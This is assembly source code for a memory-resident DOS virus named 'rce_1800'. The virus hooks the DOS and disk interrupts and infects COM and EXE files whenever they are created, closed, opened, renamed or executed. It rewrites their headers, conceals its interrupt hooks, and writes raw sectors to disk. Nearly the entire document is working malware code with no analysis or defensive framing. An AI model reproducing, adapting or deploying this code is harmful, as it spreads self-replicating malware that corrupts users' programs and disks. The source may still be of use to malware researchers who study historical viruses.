;==========================================================================
;==                                                                      ==
;==             The old name of this program  --  rce_1800               ==
;==                                                                      ==
;==========================================================================


vectr_13h_off   equ     4Ch
vectr_13h_seg   equ     4Eh
vectr_21h_off   equ     84h
vectr_24h_off   equ     90h
vectr_27h_off   equ     9Ch
vectr_40h_off   equ     100h
vectr_40h_seg   equ     102h
hdsk1_parm_seg  equ     106h

file        equ   offset end_vir+1 - offset beg_vir
old_27      equ   offset end_vir+1+ 43h - offset beg_vir
old_21      equ   offset end_vir+1+ 47h - offset beg_vir
head        equ   offset end_vir+1+ 4bh - offset beg_vir   ; EXE header
  last_page   equ   head + 2
  obraz       equ   head + 4
  head_size   equ   head + 8
  ss_offs     equ   head + 0eh
  sp_offs     equ   head + 10h
  ip_offs     equ   head + 14h
  cs_offs     equ   head + 16h
file_size_a equ   offset end_vir+1+ 63h - offset beg_vir
file_size_b equ   offset end_vir+1+ 65h - offset beg_vir
buf_file    equ   offset end_vir+1+ 67h - offset beg_vir

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a

        org   100h
start:
                jmp     loc_0A6C
                mov ah,4ch
                int 21h
                          ;  End of DUMMY

beg_vir:        cli
                jmp beg_vir
                db      00h, 90h, 23h, 12h, 1Eh
loc_0A2A:
                mov     bx,es
                add     bx,10h
                add     bx,word ptr cs:cs_sav - offset beg_vir [si]
                mov     word ptr cs:jmp_cs - offset beg_vir [si],bx
                mov     bx,word ptr cs:ip_sav - offset beg_vir [si]
                mov     word ptr cs:jmp_ip - offset beg_vir [si],bx
                mov     bx,es
                add     bx,10h
                add     bx,word ptr cs:ss_sav - offset beg_vir [si]
                mov     ss,bx
                mov     sp,word ptr cs:sp_sav - offset beg_vir [si]
                db      0EAh      ; JMP Far
      jmp_ip:   dw      0000h
      jmp_cs:   dw      0000h
loc_0A59:
                mov     di,0100h
                add     si,offset saved - offset beg_vir
                movsb                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                mov     sp,ds:06
                xor     bx,bx
                push    bx
                jmp     word ptr [si-0Bh]
loc_0A6C:
                call    main


;==========================================================================
;                              SUBROUTINE
;==========================================================================

main    proc    near
                pop     si
                sub     si,offset main - offset beg_vir  ;6Bh
                cld
                cmp     word ptr cs:saved - offset beg_vir [si],5A4Dh  ; "MZ"
                je      loc_0A8C
                cli                             ; Disable interrupts
                mov     sp,si
                add     sp,file + 100h
                sti                             ; Enable interrupts
                cmp     sp,ds:06
                jae     loc_0A59
loc_0A8C:
                push    ax
                push    es
                push    si
                push    ds
                mov     di,si
                xor     ax,ax
                push    ax
                mov     ds,ax
                les     ax,dword ptr ds:vectr_13h_off
                mov     word ptr cs:old_13_a - offset beg_vir  [si],ax
                mov     word ptr cs:old_13_a - offset beg_vir + 2 [si],es
                mov     word ptr cs:old_13_40 - offset beg_vir [si],ax
                mov     word ptr cs:old_13_40 - offset beg_vir + 2 [si],es
                mov     ax,ds:vectr_40h_seg
                cmp     ax,0F000h
                jne     loc_0B2D
                mov     cs:old_13_40 - offset beg_vir + 2 [si],ax
                mov     ax,ds:vectr_40h_off
                mov     cs:old_13_40 - offset beg_vir [si],ax
                mov     dl,80h
                mov     ax,ds:hdsk1_parm_seg
                cmp     ax,0F000h
                je      loc_0AEA
                cmp     ah,0C8h
                jb      loc_0B2D
                cmp     ah,0F4h
                jae     loc_0B2D                ; Jump if above or =
                test    al,7Fh
                jnz     loc_0B2D                ; Jump if not zero
                mov     ds,ax
                cmp     word ptr ds:0000,0AA55h
                jne     loc_0B2D                ; Jump if not equal
                mov     dl,ds:0002
loc_0AEA:
                mov     ds,ax
                xor     dh,dh
                mov     cl,9
                shl     dx,cl                   ; Shift w/zeros fill
                mov     cx,dx
                xor     si,si

locloop_0AF6:
                lodsw
                cmp     ax,0FA80h
                jne     loc_0B04                ; Jump if not equal
                lodsw
                cmp     ax,7380h
                je      loc_0B0F                ; Jump if equal
                jnz     loc_0B19                ; Jump if not zero
loc_0B04:
                cmp     ax,0C2F6h
                jne     loc_0B1B                ; Jump if not equal
                lodsw
                cmp     ax,7580h
                jne     loc_0B19                ; Jump if not equal
loc_0B0F:
                inc     si
                lodsw
                cmp     ax,40CDh
                je      loc_0B20                ; Jump if equal
                sub     si,3
loc_0B19:
                dec     si
                dec     si
loc_0B1B:
                dec     si
                loop    locloop_0AF6

                jmp     short loc_0B2D
loc_0B20:
                sub     si,7
                mov     word ptr cs:old_13_a - offset beg_vir  [di],si
                mov     word ptr cs:old_13_a - offset beg_vir + 2 [di],ds
loc_0B2D:
                mov     si,di
                pop     ds
                les     ax,dword ptr ds:vectr_21h_off
                mov     cs:old_21 [si],ax
                mov     word ptr cs:old_21 + 2 [si],es
                push    cs
                pop     ds
                cmp     ax,offset new_int21 - offset beg_vir
                jne     loc_0B54                ; Jump if not equal
                xor     di,di
                mov     cx,offset old_13_40 - offset beg_vir   ;6EFh

locloop_0B4A:
                lodsb
                scasb                           ; Scan es:[di] for al
                jnz     loc_0B54                ; Jump if not zero
                loop    locloop_0B4A

                pop     es
                jmp     loc_0BE1
loc_0B54:
                pop     es
                mov     ah,49h
                int     21h             ; DOS Services  ah=function 49h
                                        ;  release memory block, es=seg
                mov     bx,0FFFFh
                mov     ah,48h
                int     21h             ; DOS Services  ah=function 48h
                                        ;  allocate memory, bx=bytes/16
                sub     bx,0E7h
                jc      loc_0BE1
                mov     cx,es
                stc
                adc     cx,bx
                mov     ah,4Ah
                int     21h             ; DOS Services  ah=function 4Ah
                                        ;  change mem allocation, bx=siz
                mov     bx,0E6h
                stc
                sbb     es:0002,bx
                push    es
                mov     es,cx
                mov     ah,4Ah
                int     21h             ; DOS Services  ah=function 4Ah
                                        ;  change mem allocation, bx=siz
                mov     ax,es
                dec     ax
                mov     ds,ax
                mov     word ptr ds:0001,8
                call    norm_adress
                mov     bx,ax
                mov     cx,dx
                pop     ds
                mov     ax,ds
                call    norm_adress
                add     ax,ds:0006
                adc     dx,0
                sub     ax,bx
                sbb     dx,cx
                jc      loc_0BA8                ; Jump if carry Set
                sub     ds:0006,ax
loc_0BA8:
                pop     si
                push    si
                push    ds
                push    cs
                xor     di,di
                mov     ds,di
                lds     ax,dword ptr ds:vectr_27h_off
                mov     cs:old_27 [si],ax
                mov     word ptr cs:old_27 + 2 [si],ds
                pop     ds
                mov     cx,head
                rep     movsb
                xor     ax,ax
                mov     ds,ax
           mov    word ptr ds:vectr_21h_off,offset new_int21 - offset beg_vir
                mov     word ptr ds:vectr_21h_off+2,es
           mov    word ptr ds:vectr_27h_off,offset new_int27 - offset beg_vir
                mov     word ptr ds:vectr_27h_off+2,es
                mov     es:file,ax
                pop     es
loc_0BE1:
                pop     si
                xor     ax,ax
                mov     ds,ax
                mov     ax,ds:vectr_13h_off
                mov     word ptr cs:old_13_b - offset beg_vir  [si],ax
                mov     ax,word ptr ds:vectr_13h_seg
                mov     word ptr cs:old_13_b - offset beg_vir + 2 [si],ax
         mov     word ptr ds:vectr_13h_off,offset new_int13 - offset beg_vir
                add     ds:vectr_13h_off,si
                mov     word ptr ds:vectr_13h_seg,cs
                pop     ds
                push    ds
                push    si
                mov     bx,si
                lds     ax,dword ptr ds:2Ah
                xor     si,si
                mov     dx,si
loc_0C11:
                lodsw
                dec     si
                test    ax,ax
                jnz     loc_0C11
                add     si,3
                lodsb
                sub     al,41h                  ; 'A'
                mov     cx,1
                push    cs
                pop     ds
                add     bx,offset new_int27 - offset beg_vir
                push    ax
                push    bx
                push    cx
                int     25h             ; Absolute disk read, drive al
                                        pop     ax
                pop     cx
                pop     bx
                inc     byte ptr [bx+0Ah]
                and     byte ptr [bx+0Ah],08h    ;0fh
                jnz     loc_0C6A
                mov     al,[bx+10h]
                xor     ah,ah
                mul     word ptr [bx+16h]       ; ax = data * ax
                add     ax,[bx+0Eh]
                push    ax
                mov     ax,[bx+11h]
                mov     dx,20h
                mul     dx                      ; dx:ax = reg * ax
                div     word ptr [bx+0Bh]       ; ax,dxrem=dx:ax/data
                pop     dx
                add     dx,ax
                mov     ax,[bx+8]
                add     ax,40h
                cmp     ax,[bx+13h]
                jb      loc_0C67                ; Jump if below
                inc     ax
                and     ax,3Fh
                add     ax,dx
                cmp     ax,[bx+13h]
                jae     loc_0C83                ; Jump if above or =

loc_0C67:
                mov     [bx+8],ax
loc_0C6A:
                pop     ax
                xor     dx,dx
                push    ax
                push    bx
                push    cx
                int     26h             ; Absolute disk write, drive al
                                        pop     ax
                pop     cx
                pop     bx
                pop     ax
                cmp     byte ptr [bx+0Ah],0
                jne     loc_0C84
                mov     dx,[bx+8]
                pop     bx
                push    bx
                int     26h             ; Absolute disk write, drive al
loc_0C83:
                pop     ax
loc_0C84:
                pop     si
                xor     ax,ax
                mov     ds,ax
                mov     ax,word ptr cs:old_13_b - offset beg_vir  [si]
                mov     ds:vectr_13h_off,ax
                mov     ax,word ptr cs:old_13_b - offset beg_vir + 2 [si]
                mov     ds:vectr_13h_seg,ax
                pop     ds
                pop     ax
                cmp     word ptr cs:saved - offset beg_vir [si],5A4Dh ;" MZ "
                jne     loc_0CA7
                jmp     loc_0A2A
loc_0CA7:
                jmp     loc_0A59
main    endp

;**********************  I n t  2 4 h  *********************

new_int24:      mov     al,3
                iret


;**********************  I n t  2 7 h  *********************

new_int27:      PUSHF
                CALL   change_21
                POPF
                JMP  dword ptr CS:[old_27+2]

;_______________________ From Int 21h _______________________

dos_2527:       MOV     CS:[old_27],DX      ;DOS Fn  25 27
                MOV     CS:[old_27+2],DS
                POPF
                IRET

dos_2521:       MOV     CS:[old_21],DX     ;DOS Fn  25 21
                MOV     CS:[old_21+2],DS
                POPF
                IRET

dos_3527:       LES    BX,CS:[old_27]      ;DOS Fn  35 27
                POPF
                IRET

dos_3521:       LES    BX,CS:[old_21]      ;DOS Fn  35 21
                POPF
                IRET

dos_4B00:       CALL   zaraza               ;DOS Fn  4B 00
                CALL   change_21
                POPF
                JMP   dword ptr CS:[old_21+2]

l_2:            cli
                jmp l_2

;*************************  I n t  2 1 h  *******************************

new_int21:      PUSH   BP
                MOV    BP,SP
                PUSH   [BP+06]
                POPF
                POP    BP
                PUSHF
                CALL   sub_1026
                CMP    AX,2521h
                JZ     dos_2521

                CMP    AX,2527h
                JZ     dos_2527

                CMP    AX,3521h
                JZ     dos_3521

                CMP    AX,3527h
                JZ     dos_3527

                CLD
                CMP    AX,4B00h
                JZ     dos_4b00

                CMP    AH,3Ch      ; Make file
                JZ     loc_0D27

                CMP    AH,3Eh      ; Close  file handler
                JZ     loc_0D63

                CMP    AH,5Bh     ; Make file
                JNZ    loc_0D8D

loc_0d27:       CMP    word ptr CS:[file],0000  ;****** byte ptr ?????? ****
                JNZ    loc_0DA4
                CALL   quest
                JNZ    loc_0DA4
                CALL   change_21
                POPF
                CALL   old_int_21h
                JC     loc_0DAB
                PUSHF
                PUSH   ES
                PUSH   CS
                POP    ES
                PUSH   SI
                PUSH   DI
                PUSH   CX
                PUSH   AX
                MOV    DI,file
                STOSW
                MOV    SI,DX
                MOV    CX,0041h

locloop_0d4e:
                lodsb
                stosb
                test    al,al
                jz      loc_0D5B
                loop    locloop_0D4E

                mov     word ptr es:[offset end_vir - offset beg_vir + 1] ,cx
loc_0D5B:
                pop     ax
                pop     cx
                pop     di
                pop     si
                pop     es
loc_0D60:
                popf
                jnc     loc_0DAB
loc_0d63:       cmp     bx,word ptr cs:[file]
                jne     loc_0DA4
                test    bx,bx
                jz      loc_0DA4
                call    change_21
                popf
                call    old_int_21h
                jc      loc_0DAB
                pushf
                push    ds
                push    cs
                pop     ds
                push    dx
                mov     dx,file + 2
                call    zaraza
                mov     word ptr cs:[offset end_vir - offset beg_vir + 1] ,0
                pop     dx
                pop     ds
                jmp     short loc_0D60
loc_0d8d:       cmp     ah,3Dh
                je      loc_0D9C
                cmp     ah,43h
                je      loc_0D9C
                cmp     ah,56h
                jne     loc_0DA4
loc_0D9C:
                call    quest
                jnz     loc_0DA4
                call    zaraza
loc_0DA4:
                call    change_21
                popf
                call    old_int_21h
loc_0DAB:
                pushf
                push    ds
                call    sub_107F
                mov     byte ptr ds:0000,5Ah    ; 'Z'
                pop     ds
                popf
                retf    2                       ; Return far

;==========================================================================
;                            COM & EXE OR NOT
;==========================================================================

quest   proc    near
                push    ax
                push    si
                mov     si,dx
loc_0DBE:
                lodsb
                test    al,al
                jz      loc_0DE7
                cmp     al,2Eh                  ; '.'
                jne     loc_0DBE
                call    shift
                mov     ah,al
                call    shift
                cmp     ax,636Fh                ; 'co'
                je      loc_0DE0
                cmp     ax,6578h                ; 'ex'
                jne     loc_0DE9
                call    shift
                cmp     al,65h                  ; 'e'
                jmp     short loc_0DE9
loc_0DE0:
                call    shift
                cmp     al,6Dh                  ; 'm'
                jmp     short loc_0DE9
loc_0DE7:
                inc     al
loc_0DE9:
                pop     si
                pop     ax
                retn
quest   endp


;==========================================================================
;                              SHIFT
;==========================================================================

shift   proc    near
                lodsb
                cmp     al,43h                  ; 'C'
                jb      loc_ret_0DF7            ; Jump if below
                cmp     al,59h                  ; 'Y'
                jae     loc_ret_0DF7            ; Jump if above or =
                add     al,20h                  ; ' '

loc_ret_0DF7:
                retn
shift   endp


;==========================================================================
;                              OLD INT 21
;==========================================================================

old_int_21h     proc    near
                pushf
                call    dword ptr cs:old_21
                retn
old_int_21h     endp


;==========================================================================
;                              ZARAZA
;==========================================================================

zaraza  proc    near
                push    ds
                push    es
                push    si
                push    di
                push    ax
                push    bx
                push    cx
                push    dx
                mov     si,ds
                xor     ax,ax
                mov     ds,ax
                les     ax,dword ptr ds:vectr_24h_off
                push    es
                push    ax
        mov  word ptr ds:vectr_24h_off,offset new_int24 - offset beg_vir
                mov     word ptr ds:vectr_24h_off+2,cs
                les     ax,dword ptr ds:vectr_13h_off
                mov     cs:[old_13_b - offset beg_vir]  ,ax
                mov     cs:[old_13_b - offset beg_vir + 2] ,es
        mov     word ptr ds:vectr_13h_off,offset new_int13 - offset beg_vir
                mov     ds:vectr_13h_seg,cs
                push    es
                push    ax
                mov     ds,si
                xor     cx,cx
                mov     ax,4300h
                call    old_int_21h
                mov     bx,cx
                and     cl,0FEh
                cmp     cl,bl
                je      loc_0E50
                mov     ax,4301h
                call    old_int_21h
                stc
loc_0E50:
                pushf
                push    ds
                push    dx
                push    bx
                mov     ax,3D02h
                call    old_int_21h
                jc      loc_0E66
                mov     bx,ax
                call    zarazhenie
                mov     ah,3Eh
                call    old_int_21h
loc_0E66:
                pop     cx
                pop     dx
                pop     ds
                popf
                jnc     loc_0E72
                mov     ax,4301h
                call    old_int_21h
loc_0E72:
                xor     ax,ax
                mov     ds,ax
                pop     word ptr ds:vectr_13h_off
                pop     word ptr ds:vectr_13h_seg
                pop     word ptr ds:vectr_24h_off
                pop     word ptr ds:vectr_24h_off+2
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     di
                pop     si
                pop     es
                pop     ds
                retn
zaraza  endp


;==========================================================================
;                              ZARAZHENIE
;==========================================================================

zarazhenie      proc    near
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     dx,head
                mov     cx,18h
                mov     ah,3Fh
                int     21h             ; DOS Services  ah=function 3Fh
                                        ;  read file, cx=bytes, to ds:dx
                xor     cx,cx
                xor     dx,dx
                mov     ax,4202h
                int     21h             ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
                mov     word ptr ds:file_size_b,dx
                cmp     ax,offset old_13_40 - offset beg_vir
                sbb     dx,0
                jc      loc_ret_0F20
                mov     word ptr ds:file_size_a,ax
                cmp     word ptr ds:head,5A4Dh       ;   " MZ "
                jne     loc_0ED4
                mov     ax,word ptr ds:head_size
                add     ax,word ptr ds:cs_offs
                call    norm_adress
                add     ax,word ptr ds:ip_offs
                adc     dx,0
                mov     cx,dx
                mov     dx,ax
                jmp     short loc_0EE9
loc_0ED4:
                cmp     byte ptr ds:head,0E9h
                jne     loc_0F21
                mov     dx,word ptr ds:head+1
                add     dx,103h
                jc      loc_0F21
                dec     dh
                xor     cx,cx
loc_0EE9:
                sub     dx,offset loc_0a6c - offset beg_vir
                sbb     cx,0
                mov     ax,4200h
                int     21h             ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
                add     ax,file
                adc     dx,0
                cmp     ax,word ptr ds:file_size_a
                jne     loc_0F21
                cmp     dx,word ptr ds:file_size_b
                jne     loc_0F21
                mov     dx,buf_file
                mov     si,dx
                mov     cx,offset old_13_40 - offset beg_vir  ;6EFh
                mov     ah,3Fh
                int     21h             ; DOS Services  ah=function 3Fh
                                        ;  read file, cx=bytes, to ds:dx
                jc      loc_0F21
                cmp     cx,ax
                jne     loc_0F21
                xor     di,di

locloop_0F1A:
                lodsb
                scasb                           ; Scan es:[di] for al
                jnz     loc_0F21
                loop    locloop_0F1A


loc_ret_0F20:
                retn
loc_0F21:
                xor     cx,cx
                xor     dx,dx
                mov     ax,4202h
                int     21h             ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
                cmp     word ptr ds:head,5A4Dh         ;" MZ "
                je      loc_0F3B
                add     ax,head + 200h
                adc     dx,0
                jz      loc_0F52
                retn
loc_0F3B:
                mov     dx,word ptr ds:file_size_a
                neg     dl
                and     dx,0Fh
                xor     cx,cx
                mov     ax,4201h
                int     21h             ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
                mov     word ptr ds:file_size_a,ax
                mov     word ptr ds:file_size_b,dx
loc_0F52:
                mov     ax,5700h
                int     21h             ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
                pushf
                push    cx
                push    dx
                cmp     word ptr ds:head,5A4Dh    ;  " MZ "
                je      loc_0F67
                mov     ax,100h
                jmp     short loc_0F6E
loc_0F67:
                mov     ax,word ptr ds:ip_offs
                mov     dx,word ptr ds:cs_offs
loc_0F6E:
                mov     di,offset ip_sav - offset beg_vir
                stosw
                mov     ax,dx
                stosw
                mov     ax,word ptr ds:sp_offs
                stosw
                mov     ax,word ptr ds:ss_offs
                stosw
                mov     si,head
                movsb
                movsw
                xor     dx,dx
                mov     cx,file
                mov     ah,40h
                int     21h             ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
                jc      loc_0FB3
                xor     cx,ax
                jnz     loc_0FB3
                mov     dx,cx
                mov     ax,4200h
                int     21h             ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
                cmp     word ptr ds:head,5A4Dh  ;  " MZ "
                je      loc_0FB5
                mov     byte ptr ds:head,0E9h
                mov     ax,word ptr ds:file_size_a
                add     ax,offset loc_0a6c - offset beg_vir - 3
                mov     word ptr ds:head+1,ax
                mov     cx,3
                jmp     short loc_100A
loc_0FB3:
                jmp     short loc_1011
loc_0FB5:
                call    norm_long_head
                not     ax
                not     dx
                inc     ax
                jnz     loc_0FC0
                inc     dx
loc_0FC0:
                add     ax,ds:file_size_a
                adc     dx,ds:file_size_b
                mov     cx,10h
                div     cx                      ; ax,dx rem=dx:ax/reg
           mov   word ptr ds:ip_offs,offset loc_0a6c - offset beg_vir ;68h
                mov     ds:cs_offs,ax
                add     ax,71h
                mov     ds:ss_offs,ax
                mov     word ptr ds:sp_offs,100h
                add     word ptr ds:file_size_a,file
                adc     word ptr ds:file_size_b,0
                mov     ax,ds:file_size_a
                and     ax,1FFh
                mov     ds:last_page,ax
                pushf
                mov     ax,word ptr ds:file_size_a+1
                shr     byte ptr ds:file_size_b+1,1     ; Shift w/zeros fill
                rcr     ax,1                    ; Rotate thru carry
                popf
                jz      loc_1004
                inc     ax
loc_1004:
                mov     ds:obraz,ax
                mov     cx,18h
loc_100A:
                mov     dx,head
                mov     ah,40h
                int     21h             ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
loc_1011:
                pop     dx
                pop     cx
                popf
                jc      loc_ret_101B
                mov     ax,5701h
                int     21h             ; DOS Services  ah=function 57h
                                        ;  get/set file date & time

loc_ret_101B:
                retn
zarazhenie      endp


;==========================================================================
;                              CHANGE Int 21
;==========================================================================

change_21       proc    near
                push    ds
                call    sub_107F
                mov     byte ptr ds:0000,4Dh    ; 'M'
                pop     ds
sub_1026:       push    ds
                push    ax
                push    bx
                push    dx
                xor     bx,bx
                mov     ds,bx
                lds     dx,dword ptr ds:vectr_21h_off
                cmp     dx,offset new_int21 - offset beg_vir
                jne     loc_1042
                mov     ax,ds
                mov     bx,cs
                cmp     ax,bx
                je      loc_107A
                xor     bx,bx
loc_1042:
                mov     ax,[bx]
                cmp     ax,offset new_int21  - offset beg_vir
                jne     loc_1050
                mov     ax,cs
                cmp     ax,[bx+2]
                je      loc_1055
loc_1050:
                inc     bx
                jnz     loc_1042
                jz      loc_106E
loc_1055:
                mov     ax,cs:old_21
                mov     [bx],ax
                mov     ax,word ptr cs:old_21 +2
                mov     [bx+2],ax
                mov     cs:old_21 ,dx
                mov     word ptr cs:old_21 + 2,ds
                xor     bx,bx
loc_106E:
                mov     ds,bx
            mov  word ptr ds:vectr_21h_off,offset new_int21 - offset beg_vir
                mov     word ptr ds:vectr_21h_off+2,cs
loc_107A:
                pop     dx
                pop     bx
                pop     ax
                pop     ds
                retn
change_21       endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_107F        proc    near
                push    ax
                push    bx
                mov     ah,62h
                call    old_int_21h
                mov     ax,cs
                dec     ax
                dec     bx
loc_108A:
                mov     ds,bx
                stc
                adc     bx,ds:0003
                cmp     bx,ax
                jb      loc_108A
                pop     bx
                pop     ax
                retn
sub_107F        endp


;==========================================================================
;              AX = AX * 10h & size of header
;==========================================================================

norm_long_head  proc    near
                mov     ax,word ptr ds:head_size
norm_adress:
                mov     dx,10h
                mul     dx                      ; dx:ax = reg * ax
                retn
norm_long_head  endp

l_3:            cli
                jmp l_3

;***********************   I n t  1 3 h  ***********************

new_int13:      CMP    AH,03
                JNZ    loc_10FC
                CMP    DL,80h
                JNC    loc_10F7
                db 0EAh                 ; JMP    [old_13_40]
old_13_40 :     dw ?
                dw ?
loc_10f7 :      db 0EAh                 ; JMP    [old_13_a]
 old_13_a :     dw ?
                dw ?
loc_10fc :      db 0EAh                 ; JMP    [old_13_b]
 old_13_b :     dw ?
                dw ?

 ip_sav   :       db   00h, 01h
 cs_sav   :       db   21h, 00h
 sp_sav   :       db   90h, 90h
 ss_sav   :       db   90h, 90h
 saved    :       db   90h, 90h
end_vir   :       db   90h

seg_a           ends
                end     start
                